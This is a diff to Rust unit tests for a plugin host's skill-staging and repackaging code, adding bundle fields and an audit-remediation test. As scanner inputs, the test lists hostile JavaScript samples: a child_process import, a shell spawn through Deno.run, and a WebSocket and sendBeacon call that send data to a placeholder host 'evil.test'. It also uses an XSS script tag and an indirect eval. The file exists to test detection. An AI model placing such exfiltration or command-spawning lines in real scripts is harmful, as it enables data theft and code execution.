@@ -238,6 +238,8 @@ fn ut_083_diff_01_promote_01_and_stg_01_hardening() {
             rel_path: "scripts/run.txt".to_string(),
             content: "x".to_string(),
         }],
+        references: vec![],
+        assets: vec![],
     };
     assert!(matches!(
         plugin.promote_staging(&bad_ext_bundle, plugin.revision()),
@@ -253,6 +255,8 @@ fn ut_083_diff_01_promote_01_and_stg_01_hardening() {
             rel_path: "scripts/indirect.js".to_string(),
             content: "Reflect.apply(eval, null, [x]);".to_string(),
         }],
+        references: vec![],
+        assets: vec![],
     };
     assert!(matches!(
         plugin.promote_staging(&reflect_eval_bundle, plugin.revision()),
@@ -299,6 +303,8 @@ fn ut_083_diff_01_promote_01_and_stg_01_hardening() {
                 .unwrap()
                 .to_string(),
         }],
+        references: vec![],
+        assets: vec![],
     };
     assert!(matches!(
         mismatched_entry_plugin.promote_staging(&omitted_fm_bundle, rev_entry),
@@ -329,6 +335,8 @@ fn ut_083_diff_01_promote_01_and_stg_01_hardening() {
                 .unwrap()
                 .to_string(),
         }],
+        references: vec![],
+        assets: vec![],
     };
     plugin
         .promote_staging(&clean_bundle, plugin.revision())
@@ -655,4 +663,122 @@ fn ut_083_sre_01_storage_error_mapping() {
         }),
         DomainStorageAction::UnmappedFatal { .. }
     ));
+}
+
+#[test]
+fn ut_round2_audit_remediations_plugin_host() {
+    use plugin_host::{
+        auto_fix_issues, lifecycle::learn_pipeline::MAX_CARDS_PER_SCOPE,
+        repackager::scan_external_script_security, validate_staged_prompt_content, LintIssue,
+        LintIssueCategory, LintSeverity, SkillRegistry,
+    };
+    use std::path::Path;
+
+    assert_eq!(MAX_CARDS_PER_SCOPE, 1_000);
+
+    // 1. LintIssue omits None optional fields cleanly on wire
+    let issue = LintIssue {
+        rule_id: "R-1".to_string(),
+        category: LintIssueCategory::AntiAiSlop,
+        severity: LintSeverity::Warning,
+        message: "Test".to_string(),
+        line: None,
+        column: None,
+        snippet: None,
+        auto_fixable: false,
+    };
+    let issue_json = serde_json::to_value(&issue).unwrap();
+    assert!(issue_json.get("line").is_none());
+    assert!(issue_json.get("column").is_none());
+    assert!(issue_json.get("snippet").is_none());
+
+    // 2. Repackager accepts safe relative script entry_point & preserves references + binary assets
+    let src_dir = tempfile::tempdir().unwrap();
+    let dst_dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        src_dir.path().join("run.js"),
+        "export function run() { return 'ok'; }\n",
+    )
+    .unwrap();
+    std::fs::write(src_dir.path().join("guide.md"), "# Guide\nSafe docs.\n").unwrap();
+    std::fs::write(
+        src_dir.path().join("badge.png"),
+        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
+    )
+    .unwrap();
+    let manifest = SkillManifest {
+        name: "script-entry-skill".to_string(),
+        version: "2.0.0".to_string(),
+        description: "Uses safe script entry point".to_string(),
+        entry_point: "scripts/run.js".to_string(),
+        capabilities_required: vec!["lint".to_string()],
+        risk_tier: 2,
+        parameters: Some(serde_json::json!({ "type": "object" })),
+        tags: vec!["repackaged".to_string(), "cli".to_string()],
+        prompt_overview: Some("Safe overview".to_string()),
+    };
+    let receipt = SkillRepackager::repackage_directory_with_manifest(
+        src_dir.path(),
+        dst_dir.path(),
+        "script-entry-skill",
+        manifest,
+        None,
+        Some("https://github.com/cowok-ai/script-entry-skill"),
+    )
+    .expect("safe relative script entry_point must succeed");
+    let loaded = load_verified_staged_bundle_from_dir(Path::new(&receipt.target_dir), None)
+        .expect("verified bundle loads scripts, references, and binary assets");
+    assert_eq!(loaded.manifest.entry_point, "scripts/run.js");
+    assert_eq!(loaded.scripts.len(), 1);
+    assert_eq!(loaded.references.len(), 1);
+    assert_eq!(loaded.assets.len(), 1);
+    assert_eq!(loaded.assets[0].rel_path, "assets/badge.png");
+
+    // HTTP (non-HTTPS) upstream_url must be rejected
+    assert!(SkillRepackager::repackage_directory(
+        src_dir.path(),
+        dst_dir.path(),
+        "http-rejected",
+        "Plain HTTP must fail",
+        vec![],
+        Some("http://github.com/cowok-ai/insecure"),
+    )
+    .is_err());
+
+    // 3. validate_staged_prompt_content shares scan_skill_markdown_safety XSS/IPI coverage
+    assert!(validate_staged_prompt_content("<script>alert(1)</script>").is_err());
+    assert!(validate_staged_prompt_content("![x](data:image/png;base64,AAAA)").is_err());
+
+    // 4. security_scanner catches ESM dynamic imports, require("fs"), Deno.run, WebSocket, sendBeacon
+    for evil in [
+        "const cp = await import('child_process');",
+        "const fs = require('fs');",
+        "Deno.run({ cmd: ['sh'] });",
+        "const ws = new WebSocket('wss://evil.test');",
+        "navigator.sendBeacon('https://evil.test', data);",
+    ] {
+        assert!(
+            scan_external_script_security("scripts/mod.mjs", evil).is_err(),
+            "expected security_scanner rejection for: {evil}"
+        );
+    }
+
+    // 5. auto_fixer matches uppercase hex/head tags
+    let (fixed_html, count) = auto_fix_issues("<HEAD><div style=\"color:#6366F1\">hi</div></HEAD>");
+    assert!(count >= 2);
+    assert!(fixed_html.contains("var(--action-primary, #2563eb)"));
+    assert!(fixed_html.contains("name=\"viewport\""));
+
+    // 6. SkillRegistry::discover enforces SKILL.md safety + valid entry_point + records rejections
+    let reg_dir = tempfile::tempdir().unwrap();
+    let bad_skill = reg_dir.path().join("bad-skill");
+    std::fs::create_dir_all(&bad_skill).unwrap();
+    std::fs::write(
+        bad_skill.join("SKILL.md"),
+        "---\nname: bad-skill\nversion: \"1.0.0\"\ndescription: \"Bad\"\nentry_point: \"scripts/missing.sh\"\n---\n<script>alert(1)</script>\n",
+    )
+    .unwrap();
+    let reg = SkillRegistry::with_directory(reg_dir.path());
+    assert!(reg.get("bad-skill").is_none());
+    assert_eq!(reg.last_rejections().len(), 1);
 }
